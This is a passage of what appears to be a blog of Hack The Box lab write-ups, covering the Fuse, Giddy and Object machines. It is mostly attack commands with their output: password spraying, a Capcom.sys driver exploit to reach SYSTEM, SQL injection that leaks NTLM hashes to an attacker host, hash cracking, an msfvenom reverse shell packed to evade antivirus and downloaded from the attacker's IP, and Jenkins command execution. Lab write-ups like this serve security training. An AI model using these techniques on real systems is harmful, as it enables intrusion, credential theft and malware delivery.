STATUS_LOGON_FAILURE SMB 10.10.10.193 445 FUSE [-] fabricorp.local\\dandrews:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE SMB 10.10.10.193 445 FUSE [-] fabricorp.local\\DefaultAccount:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE SMB 10.10.10.193 445 FUSE [-] fabricorp.local\\dmuir:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE SMB 10.10.10.193 445 FUSE [-] fabricorp.local\\Guest:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE SMB 10.10.10.193 445 FUSE [-] fabricorp.local\\krbtgt:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE SMB 10.10.10.193 445 FUSE [-] fabricorp.local\\mberbatov:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE SMB 10.10.10.193 445 FUSE [-] fabricorp.local\\pmerton:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE SMB 10.10.10.193 445 FUSE [-] fabricorp.local\\sthompson:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE SMB 10.10.10.193 445 FUSE [+] fabricorp.local\\svc-print:$fab@s3Rv1ce$1 SMB 10.10.10.193 445 FUSE [+] fabricorp.local\\svc-scan:$fab@s3Rv1ce$1 SMB 10.10.10.193 445 FUSE [-] fabricorp.local\\tlavel:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE If we test for winrm, we see that svc-print has permissions └─$ crackmapexec winrm 10.10.10.193 -u users.list -p \u0026#39;$fab@s3Rv1ce$1\u0026#39; --continue-on-success SMB 10.10.10.193 5985 FUSE [*] Windows 10.0 Build 14393 (name:FUSE) (domain:fabricorp.local) HTTP 10.10.10.193 5985 FUSE [*] http://10.10.10.193:5985/wsman WINRM 10.10.10.193 5985 FUSE [-] fabricorp.local\\Administrator:$fab@s3Rv1ce$1 WINRM 10.10.10.193 5985 FUSE [-] fabricorp.local\\astein:$fab@s3Rv1ce$1 WINRM 10.10.10.193 5985 FUSE [-] fabricorp.local\\bhult:$fab@s3Rv1ce$1 WINRM 10.10.10.193 5985 FUSE [-] fabricorp.local\\bnielson:$fab@s3Rv1ce$1 WINRM 10.10.10.193 5985 FUSE [-] fabricorp.local\\dandrews:$fab@s3Rv1ce$1 WINRM 10.10.10.193 5985 FUSE [-] fabricorp.local\\DefaultAccount:$fab@s3Rv1ce$1 WINRM 10.10.10.193 5985 FUSE [-] fabricorp.local\\dmuir:$fab@s3Rv1ce$1 WINRM 10.10.10.193 5985 FUSE [-] fabricorp.local\\Guest:$fab@s3Rv1ce$1 WINRM 10.10.10.193 5985 FUSE [-] fabricorp.local\\krbtgt:$fab@s3Rv1ce$1 WINRM 10.10.10.193 5985 FUSE [-] fabricorp.local\\mberbatov:$fab@s3Rv1ce$1 WINRM 10.10.10.193 5985 FUSE [-] fabricorp.local\\pmerton:$fab@s3Rv1ce$1 WINRM 10.10.10.193 5985 FUSE [-] fabricorp.local\\sthompson:$fab@s3Rv1ce$1 WINRM 10.10.10.193 5985 FUSE [+] fabricorp.local\\svc-print:$fab@s3Rv1ce$1 (Pwn3d!) WINRM 10.10.10.193 5985 FUSE [-] fabricorp.local\\svc-scan:$fab@s3Rv1ce$1 WINRM 10.10.10.193 5985 FUSE [-] fabricorp.local\\tlavel:$fab@s3Rv1ce$1 winrm └─$ evil-winrm -u \u0026#39;fabricorp.local\\svc-print\u0026#39; -p \u0026#39;$fab@s3Rv1ce$1\u0026#39; -i 10.10.10.193 Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\svc-print\\Documents\u0026gt; Root whoami *Evil-WinRM* PS C:\\Users\\svc-print\\Documents\u0026gt; whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeLoadDriverPrivilege Load and unload device drivers Enabled SeShutdownPrivilege Shut down the system Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled *Evil-WinRM* PS C:\\Users\\svc-print\\Documents\u0026gt; whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes ========================================== ================ ============================================== ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Print Operators Alias S-1-5-32-550 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group BUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group FABRICORP\\IT_Accounts Group S-1-5-21-2633719317-1471316042-3957863514-1604 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\High Mandatory Level Label S-1-16-12288 *Evil-WinRM* PS C:\\Users\\svc-print\\Documents\u0026gt; tasklist tasklist.exe : ERROR: Access denied + CategoryInfo : NotSpecified: (ERROR: Access denied:String) [], RemoteException + FullyQualifiedErrorId : NativeCommandError *Evil-WinRM* PS C:\\Users\\svc-print\\Documents\u0026gt; sc.exe query [SC] OpenSCManager FAILED 5: Access is denied. We have SeLoadDriverPrivilege We can follow steps from the post I\u0026rsquo;ll create the payload first └─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.9 LPORT=6666 -f exe -o shell.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 460 bytes Final size of exe file: 7168 bytes Saved as: shell.exe Now, we need to compile ExploitCapcom and Eoploaddriver We also need Capcom.sys First we have to modify ExploitCapcom source code, so that it points to our payload Set project to Release and x64 then build it Then we have to also build our Eoploaddriver Create a new project Copy and paste the code from Eoploaddriver Set project to Release and x64 Build it Now we have all files we need After uploading the files to target box, we need to run EoPLoadDriver that we compiled It will enable SeLoadDriverPrivilege Create a registry key with setting we need And execute NTLoadDriver, which will load the driver from the registry we created *Evil-WinRM* PS C:\\Users\\svc-print\\Documents\u0026gt; .\\EoPLoadDriver.exe System\\CurrentControlSet\\MyService C:\\Users\\svc-print\\Documents\\Capcom.sys [+] Enabling SeLoadDriverPrivilege [+] SeLoadDriverPrivilege Enabled [+] Loading Driver: \\Registry\\User\\S-1-5-21-2633719317-1471316042-3957863514-1104\\System\\CurrentControlSet\\MyService NTSTATUS: 00000000, WinError: 0 Then we run the exploit driver *Evil-WinRM* PS C:\\Users\\svc-print\\Documents\u0026gt; .\\ExploitCapcom.exe [*] Capcom.sys exploit [*] Capcom.sys handle was obtained as 0000000000000080 [*] Shellcode was placed at 000001F7B1FD0008 [+] Shellcode was executed [+] Token stealing was successful [+] The SYSTEM shell was launched [*] Press any key to exit this program And if we check listener, we now have our shell ","date":"September 8, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/fuse/images/fuse.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/fuse/","summary":"Fuse Enumeration nmap └─$ nmap -Pn -p- 10.10.10.193 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-09 16:32 BST Nmap scan report for 10.10.10.193 (10.10.10.193) Host is up (0.092s latency). Not shown: 65517 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 49667/tcp open unknown 49675/tcp open unknown 49676/tcp open unknown 49680/tcp open unknown 49698/tcp open unknown └─$ nmap -Pn -p53,80,88,135,139,445,464,593,636,3268,3269,5985 -sC -sV 10.","tags":["HTB","ldap","ldapsearch","rpc","smb","winrm","evil-winrm","crackmapexec","smbmap","rpcclient","papercut","cewl","hydra","impacket-smbpasswd","rpcclient","capcom-sys","driver","visual-studio","eoploaddriver","msfvenom","SeLoadDriverPrivilege"],"title":"[HTB] Machine: Fuse"},{"categories":null,"contents":"Giddy Enumeration nmap └─$ nmap -Pn -F 10.10.10.104 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-08 17:16 BST Nmap scan report for 10.10.10.104 (10.10.10.104) Host is up (0.12s latency). Not shown: 97 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 443/tcp open https 3389/tcp open ms-wbt-server 5985/tcp open wsman Nmap done: 1 IP address (1 host up) scanned in 3.96 seconds └─$ nmap -Pn -p80,443,3389,5985 -sC -sV 10.10.10.104 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-08 17:17 BST Nmap scan report for 10.10.10.104 (10.10.10.104) Host is up (0.12s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: IIS Windows Server |_http-server-header: Microsoft-IIS/10.0 443/tcp open ssl/http Microsoft IIS httpd 10.0 |_ssl-date: 2023-09-08T16:17:11+00:00; -37s from scanner time. | ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite | Not valid before: 2018-06-16T21:28:55 |_Not valid after: 2018-09-14T21:28:55 | tls-alpn: | h2 |_ http/1.1 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: IIS Windows Server 3389/tcp open ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject: commonName=Giddy | Not valid before: 2023-09-07T15:57:53 |_Not valid after: 2024-03-08T15:57:53 |_ssl-date: 2023-09-08T16:17:11+00:00; -37s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -37s, deviation: 0s, median: -37s Web Server Ports 80, 443 gobuster └─$ gobuster dir -u https://10.10.10.104/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,asp,aspx --no-error -k =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: https://10.10.10.104/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt,asp,aspx [+] Timeout: 10s =============================================================== 2023/09/08 17:30:46 Starting gobuster in directory enumeration mode =============================================================== /remote (Status: 302) [Size: 157] [--\u0026gt; /Remote/default.aspx?ReturnUrl=%2fremote] /mvc (Status: 301) [Size: 148] [--\u0026gt; https://10.10.10.104/mvc/] /remote /mvc Foothold/User Let\u0026rsquo;s try basic SQLi payloads Searching for a' results in error Let\u0026rsquo;s save request in Burp and send it sqlmap sqlmap -r sqli.req --batch --level 5 --risk 3 --dbms mssql └─$ sqlmap -r sqli.req --batch --level 5 --risk 3 --dbms mssql ___ __H__ ___ ___[,]_____ ___ ___ {1.7.8#stable} |_ -| . [)] | .\u0026#39;| . | |___|_ [\u0026#34;]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 18:57:35 /2023-09-08/ [18:57:35] [INFO] parsing HTTP request from \u0026#39;sqli.req\u0026#39; custom injection marker (\u0026#39;*\u0026#39;) found in POST body. Do you want to process it? [Y/n/q] Y Cookie parameter \u0026#39;__AntiXsrfToken\u0026#39; appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N [18:57:35] [INFO] testing connection to the target URL [18:57:37] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS [18:57:37] [INFO] testing if the target URL content is stable ... Type: time-based blind Title: Microsoft SQL Server/Sybase time-based blind (IF) Payload: __EVENTTARGET=\u0026amp;__EVENTARGUMENT=\u0026amp;__VIEWSTATE=c39aSrrjVegYDnshUTW+tNB6JgaUTspv/jwxhdWD0ZKSiBKYDSZRbeQS5GlfLXhYcxXgekuVXU6GOreLHWeEiD4G8Mvpnb+EmRG2dWHeiQfkd5ClbRT8iCeAS//d6Z+jJTJMnY0Uq4fG9Hhjr5oAipmU0a+aWHhjepvZRKVR4gubRNAjVlpH8QSpLXNUmiZoPBNZfyX/FVUzuI7b4QW9IHQDdcu/FSWG87eJFsqfFvtJifABxmDkFC/tEVGh0a6i6xecxTBdhQOXjxqKXCa+/QDTGUK0/x7pYNQvt+he9riq5DJX1Zi0YPKwkzKWTbfySMjS6ZKulVIColiEMOdeN9OF6duVFBGJmhHvl4Om1qZVql4/kSoPC4pS0RQdv/6H3KUlwCt3mKBCzZBFboIxWg==\u0026amp;__VIEWSTATEGENERATOR=7DDB321F\u0026amp;__EVENTVALIDATION=OX743Tzie8FvKX+QxA0p6nMLW4E2TVP/WtCN4hTZ6m1ACBF9Am3x7RjpJASqKWtG+/fs8OiDDjS40ASGZvzak7WVvvs2/D9mWRH7wBI8Ap1mb+BxjDArHPt9wTcjXzxYSkaKHq2g+rSiNKgwFxNA4g==\u0026amp;ctl00$MainContent$SearchTerm=\u0026#39; WAITFOR DELAY \u0026#39;0:0:5\u0026#39;-- UEvz\u0026amp;ctl00$MainContent$Button1=Search --- [18:59:40] [INFO] testing Microsoft SQL Server [18:59:40] [INFO] confirming Microsoft SQL Server [18:59:42] [INFO] the back-end DBMS is Microsoft SQL Server web server operating system: Windows 2022 or 11 or 2016 or 2019 or 10 web application technology: Microsoft IIS 10.0, ASP.NET 4.0.30319, ASP.NET back-end DBMS: Microsoft SQL Server 2016 [18:59:42] [WARNING] HTTP error codes detected during run: 500 (Internal Server Error) - 425 times [18:59:42] [INFO] fetched data logged to text files under \u0026#39;/home/kali/.local/share/sqlmap/output/10.10.10.104\u0026#39; [*] ending @ 18:59:42 /2023-09-08/ I found nothing So let\u0026rsquo;s try to steal NTLM Let\u0026rsquo;s start responder https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#steal-netntlm-hash-relay-attack Payload: test; exec master.dbo.xp_dirtree '\\\\10.10.16.9\\anything' https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=18;exec+master.dbo.xp_dirtree+%27\\10.10.16.9\\anything%27 Let\u0026rsquo;s crack it stacy:xNnWo6272k7x └─$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt hashcat (v6.2.6) starting OpenCL API (OpenCL 3.0 PoCL 3.1+debian Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ================================================================================================================================================== * Device #1: pthread-sandybridge-12th Gen Intel(R) Core(TM) i5-12400, 1436/2936 MB (512 MB allocatable), 2MCU Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ... Dictionary cache hit: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 STACY::GIDDY:a1cd01541a3f67c9:5ba9217b272a9bae36440a0b3c78ad83:010100000000000000db988501e3d9015747a9187ea62aff0000000002000800560042004400350001001e00570049004e002d0042005700490033004500370042005a0030003400480004003400570049004e002d0042005700490033004500370042005a003000340048002e0056004200440035002e004c004f00430041004c000300140056004200440035002e004c004f00430041004c000500140056004200440035002e004c004f00430041004c000700080000db988501e3d901060004000200000008003000300000000000000000000000003000001252c1649de5058700c34bf65483319aa9b5e68a0175e5c0927b0a99755c83920a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003900000000000000000000000000:xNnWo6272k7x Session..........: hashcat Status...........: Cracked Hash.Mode........: 5600 (NetNTLMv2) Hash.Target......: STACY::GIDDY:a1cd01541a3f67c9:5ba9217b272a9bae36440...000000 Time.Started.....: Sat Sep 9 09:56:40 2023 (2 secs) Time.Estimated...: Sat Sep 9 09:56:42 2023 (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 1119.5 kH/s (0.38ms) @ Accel:256 Loops:1 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new) Progress.........: 2689024/14344385 (18.75%) Rejected.........: 0/2689024 (0.00%) Restore.Point....: 2688512/14344385 (18.74%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidate.Engine.: Device Generator Candidates.#1....: xXxElizabethxXx! -\u0026gt; x99123 Hardware.Mon.#1..: Util: 88% Started: Sat Sep 9 09:56:39 2023 Stopped: Sat Sep 9 09:56:44 2023 And it\u0026rsquo;s valid └─$ crackmapexec winrm 10.10.10.104 -u stacy -p \u0026#39;xNnWo6272k7x\u0026#39; -d \u0026#39;GIDDY\u0026#39; HTTP 10.10.10.104 5985 10.10.10.104 [*] http://10.10.10.104:5985/wsman WINRM 10.10.10.104 5985 10.10.10.104 [+] GIDDY\\stacy:xNnWo6272k7x (Pwn3d!) └─$ evil-winrm -u \u0026#39;GIDDY\\stacy\u0026#39; -p \u0026#39;xNnWo6272k7x\u0026#39; -i 10.10.10.104 Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Stacy\\Documents\u0026gt; Root whoami *Evil-WinRM* PS C:\\Users\\Stacy\\Documents\u0026gt; whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled *Evil-WinRM* PS C:\\Users\\Stacy\\Documents\u0026gt; whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes ====================================== ================ ============ ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Local account Well-known group S-1-5-113 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Mandatory Level Label S-1-16-8192 Enumerate We don\u0026rsquo;t have permissions to list services and tasks *Evil-WinRM* PS C:\\Users\\Stacy\\Documents\u0026gt; dir Directory: C:\\Users\\Stacy\\Documents Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 6/17/2018 9:36 AM 6 unifivideo So I tried powerup but we have ConstrainedLanguage To test $ExecutionContext.SessionState.LanguageMode But couldn\u0026rsquo;t make it work We can check services via registry *Evil-WinRM* PS C:\\users\u0026gt; cd HKLM:\\system\\currentcontrolset\\services *Evil-WinRM* PS HKLM:\\system\\currentcontrolset\\services\u0026gt; ls Hive: HKEY_LOCAL_MACHINE\\system\\currentcontrolset\\services Name Property ---- -------- .NET CLR Data .NET CLR Networking .NET CLR Networking 4.0.0.0 .NET Data Provider for Oracle .NET Data Provider for SqlServer ... UniFiVideoService Type : 16 Start : 2 ErrorControl : 1 ImagePath : C:\\ProgramData\\unifi-video\\avService.exe //RS//UniFiVideoService DisplayName : Ubiquiti UniFi Video DependOnService : {Tcpip, Afd} ObjectName : LocalSystem Description : Ubiquiti UniFi Video Service ... We can also check Powershell History Evil-WinRM* PS HKLM:\\system\\currentcontrolset\\services\u0026gt; (Get-PSReadLineOption).HistorySavePath C:\\Users\\Stacy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ServerRemoteHost_history.txt *Evil-WinRM* PS HKLM:\\system\\currentcontrolset\\services\u0026gt; dir \u0026#34;C:\\Users\\Stacy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\\u0026#34; Directory: C:\\Users\\Stacy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 6/17/2018 9:48 AM 207 ConsoleHost_history.txt *Evil-WinRM* PS HKLM:\\system\\currentcontrolset\\services\u0026gt; type \u0026#34;C:\\Users\\Stacy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\u0026#34; net stop unifivideoservice $ExecutionContext.SessionState.LanguageMode Stop-Service -Name Unifivideoservice -Force Get-Service -Name Unifivideoservice whoami Get-Service -ServiceName UniFiVideoService So\nWe have unifivideo\nhttps://www.exploit-db.com/exploits/43390 *Evil-WinRM* PS C:\\\u0026gt; dir programdata Directory: C:\\programdata Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 7/16/2016 9:23 AM Comms d---s- 6/16/2018 9:19 PM Microsoft d----- 9/8/2023 11:59 AM Package Cache d----- 8/18/2018 4:09 AM regid.1991-06.com.microsoft d----- 7/16/2016 9:23 AM SoftwareDistribution da---- 12/15/2021 7:57 AM unifi-video d----- 7/16/2016 9:23 AM USOPrivate d----- 6/1/2018 6:03 PM USOShared da---- 5/4/2021 10:56 AM VMware d----- 6/16/2018 9:16 PM VsTelemetry *Evil-WinRM* PS C:\\ProgramData\u0026gt; icacls unifi-video unifi-video NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(F) BUILTIN\\Administrators:(I)(OI)(CI)(F) CREATOR OWNER:(I)(OI)(CI)(IO)(F) BUILTIN\\Users:(I)(OI)(CI)(RX) BUILTIN\\Users:(I)(CI)(WD,AD,WEA,WA) Successfully processed 1 files; Failed processing 0 files Let\u0026rsquo;s generate payload └─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.9 LPORT=6666 -f exe -o evil.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 460 bytes Final size of exe file: 7168 bytes Saved as: evil.exe If we try downloading and executing the payload, it will get killed by the AV So we need to obfuscate it I used hyperion We could also use ebowla └─$ sudo wine /usr/share/windows-resources/hyperion/hyperion.exe evil.exe taskkill.exe [sudo] password for kali: Let\u0026rsquo;s upload it to box *Evil-WinRM* PS C:\\ProgramData\\unifi-video\u0026gt; iwr http://10.10.16.9/taskkill.exe -outfile taskkill.exe *Evil-WinRM* PS C:\\ProgramData\\unifi-video\u0026gt; ls Directory: C:\\ProgramData\\unifi-video Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 6/16/2018 9:54 PM bin d----- 6/16/2018 9:55 PM conf d----- 6/16/2018 10:56 PM data d----- 6/16/2018 9:54 PM email d----- 6/16/2018 9:54 PM fw d----- 6/16/2018 9:54 PM lib d----- 9/8/2023 12:01 PM logs d----- 6/16/2018 9:55 PM webapps d----- 6/16/2018 9:55 PM work -a---- 7/26/2017 6:10 PM 219136 avService.exe -a---- 6/17/2018 11:23 AM 31685 hs_err_pid1992.log -a---- 8/16/2018 7:48 PM 270597 hs_err_pid2036.mdmp -a---- 9/9/2023 5:56 AM 29184 taskkill.exe -a---- 6/16/2018 9:54 PM 780 Ubiquiti UniFi Video.lnk -a---- 7/26/2017 6:10 PM 48640 UniFiVideo.exe -a---- 7/26/2017 6:10 PM 32038 UniFiVideo.ico -a---- 6/16/2018 9:54 PM 89050 Uninstall.exe And now we stop the service and get our shell ","date":"September 8, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/giddy/images/giddy.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/giddy/","summary":"Giddy Enumeration nmap └─$ nmap -Pn -F 10.10.10.104 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-08 17:16 BST Nmap scan report for 10.10.10.104 (10.10.10.104) Host is up (0.12s latency). Not shown: 97 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 443/tcp open https 3389/tcp open ms-wbt-server 5985/tcp open wsman Nmap done: 1 IP address (1 host up) scanned in 3.96 seconds └─$ nmap -Pn -p80,443,3389,5985 -sC -sV 10.","tags":["HTB","sqli","sqlmap","winrm","net-ntlmv2","responder","hashcat","unifivideo","defender","ebowla","hyperion","smbserver","applocker","powershell-web-access"],"title":"[HTB] Machine: Giddy"},{"categories":null,"contents":"Object Enumeration nmap └─$ nmap -Pn -p- 10.10.11.132 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 09:35 BST Nmap scan report for 10.10.11.132 (10.10.11.132) Host is up (0.092s latency). Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 5985/tcp open wsman 8080/tcp open http-proxy └─$ nmap -Pn -p80,5985,8080 -sC -sV 10.10.11.132 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 09:38 BST Nmap scan report for 10.10.11.132 (10.10.11.132) Host is up (0.11s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Mega Engines 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 8080/tcp open http Jetty 9.4.43.v20210629 | http-robots.txt: 1 disallowed entry |_/ |_http-title: Site doesn\u0026#39;t have a title (text/html;charset=utf-8). |_http-server-header: Jetty(9.4.43.v20210629) Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.89 seconds Web Server Port 8080 gobuster └─$ gobuster dir -u http://object.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 txt --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://object.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/09/10 09:43:37 Starting gobuster in directory enumeration mode =============================================================== Progress: 220444 / 220561 (99.95%) =============================================================== 2023/09/10 10:02:16 Finished =============================================================== vhosts └─$ wfuzz -u http://object.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H \u0026#39;Host: FUZZ.object.htb\u0026#39; --hh 29932 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://object.htb/ Total requests: 4989 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== Total time: 341.1022 Processed Requests: 4989 Filtered Requests: 4989 Requests/sec.: 14.62611 Foothold/User #1 Let\u0026rsquo;s create an account in Jenkins Version: Jenkins 2.317 Looks like we can create a project Set a build step to Execute Windows batch command But we don\u0026rsquo;t have a build option We can try via Build Triggers: Set a schedule Or via manual triggering using API key Second method looks better We have to create a token Save it We\u0026rsquo;ll use it for authentification Set a Build trigger to Trigger builds remotely (e.g., from scripts) Input token name that we created Then save it Now we need to follow the format http://[username]:[token]@[host]/job/[job name]/build?token=[token name] No response from the server └─$ curl \u0026#39;http://pentest:111ea470a47641ff99f39fbef49e412296@10.10.11.132:8080/job/pentest/build?token=pentest\u0026#39; But if we check the Build History of the project we see a new entry Open it and click to Console Output We have our code execution We can ping our box But I couldn\u0026rsquo;t download anything powershell -c iwr http://10.10.16.9/nc64.exe -outfile c:\\programdata\\nc.exe The next steps will be based on this post The idea is to retrieve a password of admin user and check for password reuse We need to retrieve config.xml, master.key and hudson.util.Secret https://www.jenkins.io/doc/developer/security/secrets/ https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security#jenkins-secrets Then we can decrypt the password using pwn_jenkins We know that we run the commands from C:\\Users\\oliver\\AppData\\Local\\Jenkins\\.jenkins\\workspace\\pentest You can confirm it via cmd /c cd Now we need to find users directory and locate admin\u0026rsquo;s config.xml Now we check the users directory We see admin\u0026rsquo;s folder and the config.xml inside it Retrieve config.xml Save config.xml on our box \u0026lt;?xml version=\u0026#39;1.1\u0026#39; encoding=\u0026#39;UTF-8\u0026#39;?\u0026gt; \u0026lt;user\u0026gt; \u0026lt;version\u0026gt;10\u0026lt;/version\u0026gt; 